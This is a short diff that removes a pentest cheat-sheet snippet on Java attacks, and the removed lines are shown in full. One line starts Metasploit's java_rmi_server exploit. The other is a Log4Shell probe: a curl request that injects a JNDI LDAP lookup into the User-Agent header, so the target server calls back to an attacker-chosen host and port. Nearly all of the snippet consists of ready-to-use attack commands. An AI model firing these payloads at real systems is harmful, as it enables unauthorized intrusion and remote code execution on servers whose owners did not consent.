@@ -1,7 +1,0 @@
- % java
-
-# RMI
-msfconsole -x "use exploit/multi/misc/java_rmi_server" 
-
-# log4shell find
-curl -H 'User-Agent: ${jndi:ldap://<lhost>:<lport>}' <ip> 
